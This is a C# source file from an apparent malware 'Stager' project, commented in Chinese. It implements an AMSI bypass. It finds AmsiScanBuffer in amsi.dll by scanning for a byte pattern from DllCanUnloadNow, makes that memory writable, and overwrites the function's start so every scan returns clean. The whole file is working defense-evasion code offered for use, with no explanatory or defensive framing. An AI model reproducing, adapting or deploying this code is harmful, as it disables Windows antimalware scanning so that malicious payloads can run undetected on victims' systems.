using System;
using System.Runtime.InteropServices;

namespace Stager
{
    /// <summary>
    /// 对amsi.dll的 AmsiScanBuffer 函数进行Patch.
    /// </summary>
    class AMSIBypass
    {

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);


        /// <summary>
        /// 通过DllCanUnloadNow函数地址找到AmsiScanBuffer函数并进行patch
        /// </summary>
        /// <returns>patch成功则返回0，否则返回1</returns>
        public static int Patch()
        {
            //Get pointer for the amsi.dll        
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero)
            {
#if DEBUG
                Console.WriteLine("ERROR: Could not retrieve amsi.dll pointer!");
#endif
                return 1;
            }

            //Get pointer for the AmsiScanBuffer function
            IntPtr DllCanUnloadNowPtr = GetProcAddress(TargetDLL, "DllCanUnloadNow");
            if (DllCanUnloadNowPtr == IntPtr.Zero)
            {
#if DEBUG
                Console.WriteLine("ERROR: Could not retrieve DllCanUnloadNow function pointer!");
#endif
                return 1;
            }

            byte[] egg = { };
            if (IntPtr.Size == 8)
            {
                egg = new byte[] {
                    0x4C,0x8B,0xDC,
                    0x49,0x89,0x5B,0x08,
                    0x49,0x89,0x6B,0x10,
                    0x49,0x89,0x73,0x18,
                    0x57,
                    0x41,0x56,
                    0x41,0x57,
                    0x48,0x83,0xEC,0x70
                };
            }
            else {
                egg = new byte[] {
                    0x8B,0xFF,
                    0x55,
                    0x8B,0xEC,
                    0x83,0xEC,0x18,
                    0x53,
                    0x56
                };
            }

            IntPtr address = FindAddress(DllCanUnloadNowPtr, egg);
#if DEBUG
            Console.WriteLine("Target Address :" + address);
#endif

            uint oldProtectionBuffrer = 0;
            VirtualProtect(address, (UIntPtr)2, 4, out oldProtectionBuffrer);

            byte[] patch = { 0x31, 0xC0, 0xC3 };
            Marshal.Copy(patch, 0, address, 3);

            uint a = 0;
            VirtualProtect(address, (UIntPtr)2, oldProtectionBuffrer, out a);

            return 0;
        }


        /// <summary>
        /// 找到AmsiScanBuffer的地址
        /// </summary>
        /// <param name="address">DllCanUnloadNowPtr的地址</param>
        /// <param name="egg">AmsiScanBuffer的硬编码内容</param>
        /// <returns>AmsiScanBuffer的地址</returns>
        private static IntPtr FindAddress(IntPtr address, byte[] egg) {
            while (true) {
                int count = 0;

                while (true) {
                    address = IntPtr.Add(address, 1);
                    if (Marshal.ReadByte(address) == (byte)egg.GetValue(count))
                    {
                        count++;
                        if (count == egg.Length) {
                            return IntPtr.Subtract(address, egg.Length - 1);
                        }
                    }
                    else {
                        break;
                    }
                }
            }
        }

    }
}
